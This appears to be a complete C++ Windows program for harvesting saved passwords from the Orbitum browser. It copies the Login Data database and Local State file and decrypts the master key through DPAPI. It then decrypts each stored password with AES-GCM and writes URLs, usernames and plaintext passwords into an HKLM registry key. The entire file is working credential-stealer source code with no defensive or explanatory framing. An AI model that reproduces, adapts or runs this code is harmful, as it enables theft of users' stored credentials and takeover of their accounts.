#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include <winsqlite/winsqlite3.h>
#include <vector>
#include <string>
#include <regex>
#include <openssl/bio.h>
#include <openssl/evp.h>

const char cFileL[] = "C:/Users/";
const char cFileR[] = "/AppData/Local/Orbitum/User Data/Default/Login Data";
const char cFileR1[] = "/AppData/Local/Orbitum/User Data/Local State";
const char cFileNew[] = "tmp";
const char cFileNew1[] = "tmp1";
const char cQuery[] = "SELECT origin_url, username_value, password_value FROM logins";

typedef struct tuple {
    char origin_url[BUFSIZ]         = { 0 };
    char username_value[BUFSIZ]     = { 0 };
    char decrypted_password[BUFSIZ] = { 0 };
} tuple;

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

void WriteRegistry(std::vector<tuple>* vData)
{
    HKEY hKey;
    LPCTSTR sk = TEXT("SOFTWARE\\tov_1");
    LONG retval;
    retval = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        sk,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        NULL
    );
    if (retval != ERROR_SUCCESS)
    {
        printf("Error creating key\n");
        return;
    }
    for (std::vector<tuple>::iterator it = vData->begin(); it != vData->end(); it++)
    {
        std::string str = (*it).username_value;
        str += " ";
        str += (*it).decrypted_password;

        retval = RegSetValueEx(
            hKey,
            (*it).origin_url, 
            0, 
            REG_SZ, 
            (LPBYTE)str.c_str(), 
            str.length()
        );
        if (retval != ERROR_SUCCESS)
        {
            printf("Error writing to Registry.");
            continue;
        }
    }
    retval = RegCloseKey(hKey);
    if (retval != ERROR_SUCCESS)
    {
        printf("Error closing key.");
        return;
    }
}

int readFile(char** pBuf, const char* pFileName)
{
    int iLen = 0;

    FILE* F = NULL;
    fopen_s(&F, pFileName, "rb");
    if (F == NULL)
    {
        return -1;
    }

    fseek(F, 0L, SEEK_END);
    iLen = ftell(F);
    fseek(F, 0L, SEEK_SET);

    *pBuf = (char*)calloc(iLen, 1);
    fread(*pBuf, 1, iLen, F);

    return (iLen);
}

static inline bool is_base64(unsigned char c)
{
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const unsigned char* gcm_key, char *result)
{
    EVP_CIPHER_CTX* ctx;
    int outlen, tmplen, rv;
    const unsigned char* gcm_iv = &in_data[3];
    const unsigned char* gcm_ct = &in_data[15];
    unsigned char outbuf[BUFSIZ] = { 0 };
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, gcm_key, gcm_iv);
    EVP_DecryptUpdate(ctx, outbuf, &outlen, gcm_ct, data_size - 15);
    EVP_CIPHER_CTX_free(ctx);
    memcpy(result, outbuf, outlen - 16);
}

void getMasterKey(unsigned char** pKey)
{
    char* buffer = NULL;
    readFile(&buffer, cFileNew1);
    std::string data = buffer;
    free(buffer);
    std::regex key("\"encrypted_key\":\"([^\"]+)\"");
    std::smatch smch;
    std::string::const_iterator pars(data.cbegin());
    std::regex_search(pars, data.cend(), smch, key);
    std::string decoded = base64_decode(smch.str(1));
    decoded = decoded.substr(5);
    DATA_BLOB in, out;
    in.cbData = decoded.length();
    in.pbData = (BYTE*)decoded.data();
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
    {
        printf("CryptUnprotectData failed with error 0x%.8x\n", GetLastError());
    }
    (*pKey) = (unsigned char*)calloc(32, 1);
    memcpy(*pKey, out.pbData, 32);
}

std::vector<tuple> bd_request(const char* f1, const char* f2)
{
    int retval = 0;
    unsigned char* pMasterKey = NULL;
    sqlite3* db;
    sqlite3_stmt* statementHandle;
    std::vector<tuple> obtainedData;
    
    CopyFile(
        f2,
        cFileNew1,
        FALSE
    );
    getMasterKey(&pMasterKey);
    DeleteFile(cFileNew1);

    CopyFile(
        f1,
        cFileNew,
        FALSE
    );

    retval = sqlite3_open_v2(
        cFileNew,
        &db,
        SQLITE_OPEN_READONLY,
        NULL
    );
    if (retval != SQLITE_OK)
    {
        printf("Connection error. Off\n");
        DeleteFile(cFileNew);
        exit(1);
    }

    retval = sqlite3_prepare_v2(
        db,
        cQuery,
        -1,
        &statementHandle,
        NULL
    );
    if (retval != SQLITE_OK)
    {
        printf("Query error. Off\n");
        sqlite3_close(db);
        DeleteFile(cFileNew);
        exit(2);
    }

    while (sqlite3_step(statementHandle) == SQLITE_ROW)
    {
        tuple tmp;
        memcpy(tmp.origin_url, sqlite3_column_text(statementHandle, 0), BUFSIZ);
        memcpy(tmp.username_value, sqlite3_column_text(statementHandle, 1), BUFSIZ);
        aes_gcm_decrypt(
            (const unsigned char*)sqlite3_column_blob(statementHandle, 2),
            sqlite3_column_bytes(statementHandle, 2),
            pMasterKey,
            tmp.decrypted_password
        );
        obtainedData.push_back(tmp);
    }

    sqlite3_finalize(statementHandle);
    sqlite3_close(db);
    free(pMasterKey);
    DeleteFile(cFileNew);
    return obtainedData;
}

void main()
{
    char cUsername[UNLEN + 1];
    char cFileFull[sizeof(cFileL) + sizeof(cFileR) + UNLEN + 1] = { 0 };
    char cFileFull1[sizeof(cFileL) + sizeof(cFileR1) + UNLEN + 1] = { 0 };
    DWORD username_len = UNLEN + 1;
    std::vector<tuple> obtainedData;

    GetUserName(cUsername, &username_len);
    strcat_s(cFileFull, cFileL);
    strcat_s(cFileFull, cUsername);
    strcat_s(cFileFull, cFileR);
    strcat_s(cFileFull1, cFileL);
    strcat_s(cFileFull1, cUsername);
    strcat_s(cFileFull1, cFileR1);
    
    obtainedData = bd_request(cFileFull, cFileFull1);
    
    WriteRegistry(&obtainedData);

    system("pause");
}
